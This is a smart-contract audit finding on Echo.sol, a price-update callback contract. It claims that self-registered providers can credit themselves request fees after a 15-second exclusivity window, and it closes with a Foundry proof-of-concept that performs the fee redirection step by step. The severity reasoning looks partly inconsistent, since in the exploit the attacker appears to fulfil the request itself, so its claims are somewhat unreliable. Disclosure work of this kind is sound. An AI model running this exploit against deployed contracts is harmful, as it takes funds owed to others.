### Title
Permissionless `registerProvider()` Combined with Unvalidated `providerToCredit` in `executeCallback()` Enables Fee Theft — (`target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

---

### Summary

`Echo.sol` allows any address to self-register as a provider via `registerProvider()` with no access control. After the exclusivity period expires, `executeCallback()` credits the full request fee to a caller-supplied `providerToCredit` address without verifying it is the legitimate assigned provider. An attacker who has self-registered can redirect all pending request fees to themselves, stealing funds from the legitimate provider.

---

### Finding Description

`registerProvider()` is entirely permissionless:

```solidity
function registerProvider(
    uint96 baseFeeInWei,
    uint96 feePerFeedInWei,
    uint96 feePerGasInWei
) external override {
    ProviderInfo storage provider = _state.providers[msg.sender];
    require(!provider.isRegistered, "Provider already registered");
    ...
    provider.isRegistered = true;
``` [1](#0-0) 

Any EOA or contract can call this and become a protocol-recognized provider. Once registered, the attacker calls `setFeeManager(attackerAddress)` to set themselves as their own fee manager. [2](#0-1) 

`executeCallback()` enforces `providerToCredit == req.provider` **only during the exclusivity window**. After the window expires, no such check exists:

```solidity
if (
    block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds
) {
    require(
        providerToCredit == req.provider,
        "Only assigned provider during exclusivity period"
    );
}
// No check after this point — providerToCredit is arbitrary
...
_state.providers[providerToCredit].accruedFeesInWei += SafeCast
    .toUint128((req.fee + msg.value) - pythFee);
``` [3](#0-2) 

The fee is credited to the attacker's `accruedFeesInWei` slot. The attacker then drains it via `withdrawAsFeeManager()`:

```solidity
function withdrawAsFeeManager(address provider, uint128 amount) external override {
    require(
        msg.sender == _state.providers[provider].feeManager,
        "Only fee manager"
    );
    ...
    _state.providers[provider].accruedFeesInWei -= amount;
    (bool sent, ) = msg.sender.call{value: amount}("");
``` [4](#0-3) 

---

### Impact Explanation

**Direct theft of provider fees.** Every pending request whose exclusivity period has elapsed is vulnerable. The attacker steals the full `req.fee` (the amount paid by the user minus the Pyth protocol fee) that was intended for the legitimate provider. The legitimate provider receives nothing for fulfilling the request. This is a direct, quantifiable financial loss proportional to the volume of requests in flight.

---

### Likelihood Explanation

**High.** The attack requires no privileged access, no leaked keys, and no governance majority. Any unprivileged transaction sender can:
1. Call `registerProvider(0, 0, 0)` — one transaction, no cost beyond gas.
2. Call `setFeeManager(self)` — one transaction.
3. Monitor the mempool or chain for requests whose exclusivity period has expired.
4. Front-run or race the legitimate provider's `executeCallback()` call, passing their own address as `providerToCredit`.
5. Call `withdrawAsFeeManager()` to extract the funds.

The exclusivity period is only 15 seconds by default: [5](#0-4) 

After 15 seconds, every unfulfilled request is open to this attack. A well-capitalized attacker can run a bot that continuously steals fees from the legitimate provider.

---

### Recommendation

1. **Validate `providerToCredit` in `executeCallback()`**: After the exclusivity period, restrict `providerToCredit` to registered providers only, or enforce that `providerToCredit` must equal `req.provider` at all times (and separately track a "fallback executor" who earns a smaller reward).

   ```solidity
   require(
       _state.providers[providerToCredit].isRegistered,
       "providerToCredit not registered"
   );
   ```

2. **Optionally add an allowlist for provider registration**: If the protocol intends a curated provider set, add an admin-controlled whitelist check in `registerProvider()`, analogous to the `require(msg.sender == engine, "!engine")` fix in the referenced Mochi report.

---

### Proof of Concept

```solidity
// Attacker setup (two transactions, no special privileges)
vm.prank(attacker);
echo.registerProvider(0, 0, 0);          // Step 1: self-register

vm.prank(attacker);
echo.setFeeManager(attacker);            // Step 2: set self as fee manager

// Legitimate user creates a request assigned to legitimateProvider
vm.prank(user);
uint64 seq = echo.requestPriceUpdatesWithCallback{value: totalFee}(
    legitimateProvider, publishTime, priceIds, gasLimit
);

// Wait for exclusivity period to expire (15 seconds default)
vm.warp(block.timestamp + 16);

// Attacker steals the fee by crediting themselves
vm.prank(attacker);
echo.executeCallback(
    attacker,          // providerToCredit = attacker, not legitimateProvider
    seq,
    updateData,
    priceIds
);

// Attacker withdraws stolen fees
uint128 stolen = echo.getProviderInfo(attacker).accruedFeesInWei;
vm.prank(attacker);
echo.withdrawAsFeeManager(attacker, stolen);
// attacker.balance increased by stolen fees; legitimateProvider received nothing
```
